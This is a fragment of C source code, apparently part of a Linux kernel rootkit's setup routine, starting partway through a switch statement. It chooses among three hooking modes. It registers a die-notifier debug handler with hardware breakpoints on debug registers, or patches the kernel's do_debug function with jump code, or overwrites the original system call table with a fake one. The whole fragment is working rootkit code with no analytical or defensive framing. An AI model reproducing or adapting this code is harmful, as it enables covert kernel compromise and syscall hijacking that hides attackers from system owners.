		case 'l': pentium=1;
			  register_die_notifier=(void*)0;
			  break;
		case 'e': pentium=1;
			  /*we cannot force an address for register_...*/ 
	}

	if((pentium)&&(register_die_notifier))
	{
	/*dr3 and dr2 are handled in emulate cpu, if you modify them here be
	sure doing the same there */
		if(start.regparm)
			mood_debug_handler.notifier_call=mood_exceptions_stub;
		else
			mood_debug_handler.notifier_call=mood_exceptions_notify;
		mood_mode=MOOD_ELITE;
		deactivate_magic(3);
		register_die_notifier(&mood_debug_handler);
		if(memret)
		{
			deactivate_magic(2);
			activate_magic(magic_vaddr,2,1,0);
			virtual=1;
		}
		activate_magic(magic_addr,3,1,1);

	}
	else if(pentium)
	{
		m_memcpy(do_debug,debug_jumpcode,7);
		deactivate_magic(3);
		deactivate_magic(2);
		if(magic_ptrace_addr)
		{
			activate_magic(magic_ptrace_addr,2,1,0);	
		}
		activate_magic(magic_addr,3,1,1);
		mood_mode=MOOD_LEGACY;
	}
	else
	{
		/* copy fake on original, we've finished */
		m_memcpy((char*)orig_sct,fake_sct,(NR_syscalls*sizeof(void*)));
		mood_mode=MOOD_STANDARD;
	}
	
	return mood_mode;
}
